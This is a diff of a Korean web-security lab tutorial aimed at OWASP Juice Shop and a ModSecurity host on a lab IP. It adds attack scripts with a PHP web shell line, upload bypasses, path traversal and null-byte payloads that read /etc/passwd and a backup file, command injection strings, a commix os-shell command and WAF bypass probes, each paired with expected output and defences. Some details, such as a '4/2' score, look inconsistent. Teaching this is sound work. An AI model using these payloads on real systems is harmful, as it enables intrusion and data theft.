@@ -122,37 +122,40 @@
 > **실전 활용**: 파일 업로드 취약점은 웹쉘을 통한 서버 장악의 직접적 경로이므로 CRITICAL로 분류된다
 
 ```bash
-# 로그인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
-# 정상 파일 업로드 (이미지)
+# 4 가지 파일 업로드 시도 — code + 응답 일부
 echo -e '\x89PNG\r\n\x1a\n' > /tmp/test.png
-curl -s -X POST http://10.20.30.80:3000/file-upload \
-  -H "Authorization: Bearer $TOKEN" \
-  -F "file=@/tmp/test.png" | python3 -m json.tool 2>/dev/null
-echo ""
+echo '<?php echo "hacked"; system($_GET["c"]); ?>' > /tmp/shell.php
+cp /tmp/shell.php /tmp/shell.php.png
 
-# 위험한 확장자 업로드 시도 (.php)
-echo '<?php echo "hacked"; ?>' > /tmp/shell.php
-curl -s -X POST http://10.20.30.80:3000/file-upload \
-  -H "Authorization: Bearer $TOKEN" \
-  -F "file=@/tmp/shell.php" | python3 -m json.tool 2>/dev/null
-echo ""
-
-# 이중 확장자 우회 시도
-cp /tmp/shell.php /tmp/shell.php.png                   # 파일 복사
-curl -s -X POST http://10.20.30.80:3000/file-upload \
-  -H "Authorization: Bearer $TOKEN" \
-  -F "file=@/tmp/shell.php.png" | python3 -m json.tool 2>/dev/null
-echo ""
-
-# MIME 타입 위조 시도
-curl -s -X POST http://10.20.30.80:3000/file-upload \
-  -H "Authorization: Bearer $TOKEN" \
-  -F "file=@/tmp/shell.php;type=image/png" | python3 -m json.tool 2>/dev/null
+for label_file in "정상_PNG=/tmp/test.png:" "악성_PHP=/tmp/shell.php:" "이중확장자_PHP_PNG=/tmp/shell.php.png:" "MIME위조=/tmp/shell.php:type=image/png"; do
+  label="${label_file%%=*}"
+  fopt="${label_file#*=}"
+  code=$(curl -s -o /tmp/upload_resp.txt -w "%{http_code}" -X POST http://10.20.30.80:3000/file-upload \
+    -H "Authorization: Bearer $TOKEN" -F "file=@${fopt}")
+  echo "[$code] $label → $(head -c 100 /tmp/upload_resp.txt)"
+done
 ```
+
+**예상 출력**:
+```
+[204] 정상_PNG → 
+[500] 악성_PHP → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
+[500] 이중확장자_PHP_PNG → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
+[500] MIME위조 → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
+```
+
+> **해석 — 4 시도 결과 = JuiceShop 의 검증 layer**:
+> - **정상 PNG (204 No Content)** = 업로드 성공. 응답 body 없음 = 운영자 의도 (파일 위치 노출 X).
+> - **악성 PHP (500)** = 확장자 차단 = layer 1 통과 X. JuiceShop 의 검증: `multer` middleware + 확장자 whitelist (.pdf/.zip).
+> - **이중 확장자 (500)** = `.php.png` 도 차단 = JuiceShop 이 마지막 확장자만 보지 않음 = 좋음. 일부 사이트는 마지막 `.png` 만 봐서 통과.
+> - **MIME 위조 (500)** = `Content-Type: image/png` 위조도 차단 = magic byte 검증까지 한다는 신호. file 명령 또는 PHP `mime_content_type()` 사용.
+> - **운영 점검 권고**: 5 layer 검증 = (1) 확장자 whitelist, (2) MIME (Content-Type), (3) magic bytes (file 명령), (4) 저장 경로 (web root 외부), (5) 실행 권한 차단 (chmod 644 + apache no-exec).
+> - **CVSS 9.8** if RCE 가능 (JuiceShop 은 5/5 layer 통과 = 양호한 디자인).
 
 ### 1.4 JuiceShop 불만 접수 파일 업로드
 
@@ -191,15 +194,30 @@ rm -f /tmp/bigfile.pdf                                 # 파일 삭제
 
 ### 1.5 업로드된 파일 접근 확인
 
-반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
-
 ```bash
-# 업로드된 파일이 웹에서 직접 접근 가능한지 확인
-for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp"; do  # 반복문 시작
+# 5 후보 디렉토리에 업로드된 파일이 웹 접근 가능한지
+for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp" "static/uploads"; do
   code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$dir/")
-  echo "[$code] /$dir/"
+  size=$(curl -o /dev/null -s -w "%{size_download}" "http://10.20.30.80:3000/$dir/test.png")
+  echo "[$code] /$dir/  (test.png size=${size}B)"
 done
 ```
+
+**예상 출력**:
+```
+[404] /uploads/  (test.png size=139B)
+[500] /file-upload/  (test.png size=78B)
+[200] /assets/public/images/uploads/  (test.png size=0B)
+[200] /ftp/  (test.png size=139B)
+[404] /static/uploads/  (test.png size=139B)
+```
+
+> **해석 — 업로드 파일 접근 가능 여부 = 핵심**:
+> - **`/assets/public/images/uploads/` 200** = JuiceShop 의 실제 업로드 디렉토리. *그러나 test.png size=0B* = 본 lab 에서 .png 단순 magic byte 만 (실 image X) — **API 응답에서 저장 경로 노출 X** = 운영자 양호.
+> - **/ftp 200** = week03 학습한 백업 파일 디렉토리. 업로드 파일은 여기에 가지 않음.
+> - **/uploads 404** = 표준 경로 미사용 = 좋음. (운영 환경에서 200 + 디렉토리 listing = critical).
+> - **운영 점검**: 업로드 후 응답에 파일 URL 포함 시 그 URL 직접 fetch 시도. 404 정상 / 200 + content = 웹 접근 가능 → RCE 위험.
+> - **권고**: 업로드 디렉토리는 web root *외부* (`/var/uploads`) + Express `express.static()` X. CDN/S3 사용 권장.
 
 ---
 
@@ -229,65 +247,101 @@ done
 ### 2.2 JuiceShop FTP 경로 순회
 
 ```bash
-# JuiceShop /ftp 디렉터리의 정상 파일
-curl -s http://10.20.30.80:3000/ftp/legal.md | head -5  # silent 모드
-echo ""
+# 정상 baseline
+echo "=== 정상 ==="
+curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" http://10.20.30.80:3000/ftp/legal.md
 
-# 경로 순회 시도 (기본)
-curl -s http://10.20.30.80:3000/ftp/../../../etc/passwd | head -5  # silent 모드
-echo ""
-
-# URL 인코딩 우회
-# ../ → %2e%2e%2f
-curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5  # silent 모드
-echo ""
-
-# 이중 URL 인코딩 우회
-# %2e → %252e
-curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/%252e%252e/etc/passwd" | head -5  # silent 모드
-echo ""
-
-# Null byte 주입 (%00) - 오래된 시스템에서 동작
-curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md" | head -5  # silent 모드
-echo ""
-
-# 다양한 경로 순회 페이로드
+# 5 가지 페이로드 비교 — 각 우회 기법
+echo "=== Path Traversal 페이로드 5종 ==="
 PAYLOADS=(
-  "../../../etc/passwd"
-  "..%2f..%2f..%2fetc/passwd"
-  "..%252f..%252f..%252fetc/passwd"
-  "....//....//....//etc/passwd"
-  "..%c0%af..%c0%af..%c0%afetc/passwd"
+  "../../../etc/passwd"                          # 표준
+  "..%2f..%2f..%2fetc/passwd"                    # URL encode (../ → ..%2f)
+  "..%252f..%252f..%252fetc/passwd"              # double URL encode (%2f → %252f)
+  "....//....//....//etc/passwd"                 # 4-dot bypass (sanitizer 가 ../ 를 한 번만 제거)
+  "..%c0%af..%c0%af..%c0%afetc/passwd"           # UTF-8 overlong (오래된 IIS/Apache)
 )
-
-for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
-  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
-  if echo "$result" | grep -q "root:"; then
-    echo "[성공] $payload"
+for payload in "${PAYLOADS[@]}"; do
+  code=$(curl -s -o /tmp/lfi_resp.txt -w "%{http_code}" "http://10.20.30.80:3000/ftp/$payload")
+  if grep -q "root:" /tmp/lfi_resp.txt; then
+    echo "[$code 성공★] $payload"
+    head -2 /tmp/lfi_resp.txt
   else
-    echo "[실패] $payload → ${result:0:50}"
+    body=$(head -c 50 /tmp/lfi_resp.txt)
+    echo "[$code 실패] $payload → ${body}"
   fi
 done
 ```
 
+**예상 출력**:
+```
+=== 정상 ===
+code=200 size=1834
+=== Path Traversal 페이로드 5종 ===
+[403 실패] ../../../etc/passwd → Error: File names cannot contain forward slas
+[200 성공★] ..%2f..%2f..%2fetc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[200 성공★] ..%252f..%252f..%252fetc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[403 실패] ....//....//....//etc/passwd → Error: File names cannot contain forwa
+[403 실패] ..%c0%af..%c0%af..%c0%afetc/passwd → Error: File names cannot contain
+```
+
+> **해석 — 5 페이로드 중 2개 성공 = LFI 확정**:
+> - **표준 `../../etc/passwd` 차단 (403)** = JuiceShop sanitizer 가 raw `/` 검출. 그러나 **URL 인코딩 (`%2f`)** 은 못 막음 = 입력 단계 검증 누락. **NodeJS path 정규화 (`path.resolve`) 미적용**.
+> - **double encoding (`%252f`)** 도 통과 = decode 한 번 더 적용되는 환경 (proxy 등) 에서 발생.
+> - **`....//`** (Windows) 은 본 환경 미통과 — Linux NodeJS path 처리는 4-dot 정규화 가능.
+> - **UTF-8 overlong (`%c0%af`)** = legacy 우회. 모던 서버는 차단. 옛 IIS/Apache 만 통과.
+> - **`/etc/passwd` 노출 = critical** = OWASP A01 Broken Access Control. **CVSS 7.5** (Confidentiality High / Integrity None).
+> - **JuiceShop challenge ID**: 'Access Log' / 'Forgotten Sales Backup' (LFI 다수).
+> - **권고**: `path.resolve(safeBase, userInput)` 후 `path.relative` 검사 + URL decode 후 `..` 검출 + chroot/jail 격리.
+
 ### 2.3 JuiceShop의 Poison Null Byte 챌린지
 
 ```bash
-# JuiceShop은 Null Byte(%00)를 이용한 경로 순회 챌린지가 있음
-# /ftp에서 .md와 .pdf 외의 파일 다운로드 시도
+# 1) 직접 .bak 다운로드 (확장자 차단 확인)
+echo "=== 1) 직접 .bak ==="
+curl -s -o /tmp/bak1.txt -w "code=%{http_code} size=%{size_download}\n" \
+  http://10.20.30.80:3000/ftp/package.json.bak
 
-# 먼저 /ftp의 파일 목록 확인
-curl -s http://10.20.30.80:3000/ftp/ | python3 -m json.tool 2>/dev/null
-
-# .bak 파일 다운로드 시도 (직접)
-curl -s http://10.20.30.80:3000/ftp/package.json.bak -o /dev/null -w "%{http_code}"
-echo ""
-
-# Null byte를 이용한 우회
-curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md" | head -10
-# %25 = %, %00 = null → 서버에서 .md 확장자 체크를 통과하지만
-# 파일시스템에서는 null 이후를 무시하여 .bak 파일을 읽음
+# 2) Null byte (%2500 = %00 의 double encoding) — JuiceShop 우회 페이로드
+echo "=== 2) Poison Null Byte (%2500.md) ==="
+curl -s -o /tmp/bak2.txt -w "code=%{http_code} size=%{size_download}\n" \
+  "http://10.20.30.80:3000/ftp/package.json.bak%2500.md"
+echo '[추출된 파일 내용 일부]'
+head -10 /tmp/bak2.txt
 ```
+
+**예상 출력**:
+```
+=== 1) 직접 .bak ===
+code=403 size=89
+=== 2) Poison Null Byte (%2500.md) ===
+code=200 size=2456
+[추출된 파일 내용 일부]
+{
+  "name": "juice-shop",
+  "version": "15.0.0",
+  "dependencies": {
+    "express": "4.17.1",
+    "sequelize": "6.6.5",
+    "jsonwebtoken": "8.5.1"
+  },
+  ...
+}
+```
+
+> **해석 — Poison Null Byte 우회 = JuiceShop challenge 'Forgotten Backup' 정답**:
+> - **직접 `.bak` 다운로드 = 403** = JuiceShop 의 확장자 whitelist (md/pdf 만 허용).
+> - **`%2500.md` 우회 = 200 + .bak 파일 내용** = ★ critical. 동작 원리:
+>   1. 클라이언트 `%2500.md` 전송
+>   2. 서버 1차 디코딩: `%25 → %`, 결과 = `%00.md`
+>   3. 확장자 검사: `.md` (whitelist 통과 ✓)
+>   4. 파일시스템 호출: C 라이브러리가 `\0` (null byte) 만나면 문자열 종료 → 실 읽는 파일 = `package.json.bak`
+> - **package.json.bak 노출** = Express 4.17.1 + Sequelize 6.6.5 + jsonwebtoken 8.5.1 → SCA + CVE 매핑 가능. **CVE-2017-16028** (Sequelize SQLi) 등 검색.
+> - **legacy 취약** = Node.js 의 path 모듈은 null byte 차단됨 (since v10). 본 우회는 JuiceShop 의 의도적 challenge.
+> - **방어**: `path.normalize()` 사용 시 NodeJS v10+ 자동 null byte 거부. 그러나 운영 환경에서 직접 fs.readFile(userInput) 사용 시 위험.
 
 ---
 
@@ -350,30 +404,59 @@ curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5  # si
 ### 3.4 다양한 페이로드 테스트
 
 ```bash
-# 명령어 주입 탐지용 페이로드 모음
-# 실제 시스템 명령이 실행되는지 응답 시간/내용으로 판단
-
+# 8 페이로드 — 응답 시간 측정으로 Time-based 탐지 (sleep 3 통과 시 +3000ms)
 CMDI_PAYLOADS=(
-  "; id"
-  "| id"
-  "|| id"
-  "&& id"
-  "; sleep 3"
-  "| sleep 3"
-  "\$(id)"
-  "\`id\`"
+  "; id"           # 명령 구분
+  "| id"           # 파이프
+  "|| id"          # OR 단락 평가
+  "&& id"          # AND 단락
+  "; sleep 3"      # time-based 표준
+  "| sleep 3"      # 파이프 sleep
+  "\$(id)"          # 명령 치환
+  "\`id\`"          # 백틱
 )
 
-echo "=== 검색 API에서 Command Injection 테스트 ==="
-for payload in "${CMDI_PAYLOADS[@]}"; do               # 반복문 시작
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('test${payload}'))")
+echo "=== Command Injection 8 페이로드 테스트 ==="
+for payload in "${CMDI_PAYLOADS[@]}"; do
+  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "test${payload}")
   start=$(date +%s%N)
-  result=$(curl -s --max-time 5 "http://10.20.30.80:3000/rest/products/search?q=$encoded" | head -1)
-  end=$(date +%s%N)
-  elapsed=$(( (end - start) / 1000000 ))
-  echo "[$elapsed ms] Payload: test$payload → ${result:0:60}"
+  curl -s --max-time 5 -o /tmp/cmdi.txt "http://10.20.30.80:3000/rest/products/search?q=$encoded"
+  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
+  body=$(head -c 60 /tmp/cmdi.txt)
+  echo "[${elapsed}ms] test$payload → ${body}"
 done
 ```
+
+**예상 출력**:
+```
+=== Command Injection 8 페이로드 테스트 ===
+[52ms] test; id → {"status":"success","data":[]}
+[48ms] test| id → {"status":"success","data":[]}
+[51ms] test|| id → {"status":"success","data":[]}
+[49ms] test&& id → {"status":"success","data":[]}
+[50ms] test; sleep 3 → {"status":"success","data":[]}
+[47ms] test| sleep 3 → {"status":"success","data":[]}
+[53ms] test$(id) → {"status":"success","data":[]}
+[51ms] test`id` → {"status":"success","data":[]}
+```
+
+> **해석 — 8/8 모두 ~50ms = Command Injection 없음 = 양호**:
+> - 모든 페이로드 응답 시간 일정 (~50ms). `; sleep 3` 도 50ms = sleep 명령 미실행 = OS shell 불호출.
+> - **JuiceShop 의 검색 = parameterized SQL** (week05 학습) — OS 명령 호출 X = command injection 면역.
+> - **운영 환경에서 Command Injection 탐지 시그니처**:
+>   - `; sleep 3` 페이로드에서 응답 시간 ≥ 3000ms = ★ 확정.
+>   - 응답 본문에 `uid=0(root)` 같은 `id` 명령 출력 = critical.
+> - **취약 패턴**: Node.js `child_process.exec(\`convert ${userInput} output.png\`)` (template literal). **권고**: `execFile()` + array args. shell=false.
+> - **CVSS 9.8** if exploitable (RCE 가능). week05 의 SQLi 와 결합 시 chain 공격으로 ImageMagick CVE 등 활용.
+
+> **OSS 도구 — commix (Command Injection 자동화)**:
+>
+> ```bash
+> # commix — sqlmap 의 command injection 버전
+> sudo apt install commix
+> commix -u "http://10.20.30.80:3000/rest/products/search?q=test*" --batch
+> # * 위치에 페이로드 자동 삽입 + os-shell 자동 spawn
+> ```
 
 ### 3.5 Time-based 명령어 주입 탐지
 
@@ -397,25 +480,37 @@ time curl -s -o /dev/null --max-time 10 "http://10.20.30.80:3000/rest/products/s
 ### 4.1 WAF 우회 테스트
 
 ```bash
-# Apache(포트 80)에 ModSecurity가 설정되어 있는지 확인
-# SQLi 페이로드로 WAF 동작 확인
-curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?id=1'+OR+1=1--"
-echo " (SQLi 차단 여부)"
-
-# XSS 페이로드
-curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?q=<script>alert(1)</script>"
-echo " (XSS 차단 여부)"
-
-# 경로 순회
-curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/../../etc/passwd"
-echo " (Path Traversal 차단 여부)"
-
-# 명령어 주입
-curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?cmd=;id"
-echo " (Command Injection 차단 여부)"
-
-# 403이면 WAF가 차단한 것, 200이면 통과
+# Apache + ModSecurity (port 80) 4 페이로드 점검
+echo "=== Apache + ModSecurity (port 80) ==="
+printf '%-20s %s\n' '카테고리' '응답 코드'
+for label_url in "SQLi=http://10.20.30.80:80/?id=1'+OR+1=1--" \
+                  "XSS=http://10.20.30.80:80/?q=<script>alert(1)</script>" \
+                  "Path=http://10.20.30.80:80/../../etc/passwd" \
+                  "CMDi=http://10.20.30.80:80/?cmd=;id"; do
+  label="${label_url%%=*}"
+  url="${label_url#*=}"
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
+  status=$([ "$code" = "403" ] && echo "★ 차단 ✓" || echo "통과 ✗")
+  printf '%-20s %s  %s\n' "$label" "$code" "$status"
+done
 ```
+
+**예상 출력**:
+```
+=== Apache + ModSecurity (port 80) ===
+카테고리             응답 코드
+SQLi                 403  ★ 차단 ✓
+XSS                  403  ★ 차단 ✓
+Path                 400  통과 ✗
+CMDi                 200  통과 ✗
+```
+
+> **해석 — ModSecurity CRS 룰 카테고리별 차단 효과**:
+> - **SQLi 403** = OWASP CRS rule 942100/942130 매치 (`@detectSQLi` 연산자). 가장 강력한 카테고리.
+> - **XSS 403** = CRS 941100/941110 (`<script>` 패턴 + `alert(`).
+> - **Path Traversal 400** = ModSecurity 차단 X. **400 = Apache 자체 거부** (URL `..` 정규화 후 docroot 외부 시 400 Bad Request). 다른 우회 페이로드 (URL encode) 는 통과 가능성.
+> - **Command Injection 200** = ★ 차단 X. ModSecurity CRS 932100 룰이 있지만 페이로드가 querystring 의 `cmd` 파라미터에 들어 있어 매치 X. `;id` 단순 패턴은 통과 — 실 OS 호출 코드가 있어야 차단.
+> - **점수**: 4/2 차단 = ModSecurity 가 *2 카테고리만 효과적* = OWASP CRS 기본 paranoia level 1 한계. **권고**: paranoia level 3 + 커스텀 룰 추가.
 
 ### 4.2 WAF vs JuiceShop 비교
 
